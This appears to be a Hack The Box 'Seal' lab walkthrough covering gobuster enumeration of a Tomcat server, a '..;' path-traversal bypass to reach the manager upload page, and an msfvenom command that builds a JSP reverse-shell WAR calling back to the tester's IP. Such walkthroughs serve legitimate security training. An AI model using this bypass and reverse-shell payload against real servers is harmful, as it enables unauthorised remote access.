# Enumeration -

![[Pasted image 20210715120057.png]]


### Gobuster -

```bash
root@napster:~/Documents/HTB/Seal# gobuster dir -u https://10.10.10.250/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k -t 20 -o gobuster.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.250/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/07/15 12:38:36 Starting gobuster
===============================================================
/images (Status: 302)
/js (Status: 302)
/admin (Status: 302)
/css (Status: 302)
/manager (Status: 302)
/. (Status: 200)
/icon (Status: 302)
/shell (Status: 302)
/reverse (Status: 302)
===============================================================
2021/07/15 12:44:22 Finished
===============================================================
```

We can see manager directory but its 302 on further checking for directories inside `manager` -

```bash
root@napster:~/Documents/HTB/Seal# gobuster dir -u https://10.10.10.250/manager -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k
 -t 20 -o gobuster_manager.txt                                                                                                                                
===============================================================                                                                                               
Gobuster v3.0.1                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                               
===============================================================                                                                                               
[+] Url:            https://10.10.10.250/manager                                                                                                              
[+] Threads:        20                                                                                                                                        
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt                                                                  
[+] Status codes:   200,204,301,302,307,401,403                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                            
[+] Timeout:        10s                                                                                                                                       
===============================================================                                                                                               
2021/07/15 12:54:13 Starting gobuster                                                                                                                         
===============================================================                                                                                               
/images (Status: 302)
/html (Status: 403)
/. (Status: 302)
/htmlarea (Status: 403)
/text (Status: 401)
/status (Status: 401)																							<----------->
/htmleditor (Status: 403)
/htmls (Status: 403)
/htmlemail (Status: 403)
/html2pdf (Status: 403)
/html_email (Status: 403)
/htmlMimeMail (Status: 403)
<Snip>
```

We found  `status` on visiting the url -

![[Pasted image 20210715131553.png]]

By inserting the credentials we found earlier we were able to login -

![[Pasted image 20210715131659.png]]

-  `Apache Tomcat/9.0.31 (Ubuntu)`


# Exploitation -

### Some Refrences:

- [DotDotSemicolonRCE](https://thehackingfactory.com/dot-dot-semicolon-rce)
- [HackerOne](https://hackerone.com/reports/1004007)
- [Acunetix](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)


Visiting `/html` -

![[Pasted image 20210715171057.png]]


Using `/...;/html` -

We can access the html page and we can upload war file there -

![[Pasted image 20210715171416.png]]


### Creating .war file using Msfvenom -

```bash
root@napster:~/Documents/HTB/Seal# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.127 LPORT=9001 -f war > napster.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes

root@napster:~/Documents/HTB/Seal# ls
gobuster_admin.txt  gobuster_manager.txt  gobuster.txt  nmap  Seal  napster.war  wfuzz.txt
```


### Uploading via Burp Suite -

- Catching the Upload request via Burp:


![[Pasted image 20210715182013.png]]


- Modifying the request using path traversal to upload the file -


![[Pasted image 20210715181343.png]]

- We can see our payload:


![[Pasted image 20210715181534.png]]

- Starting netcat and simply curling toour payload will give us shell:


![[Pasted image 20210715181732.png]]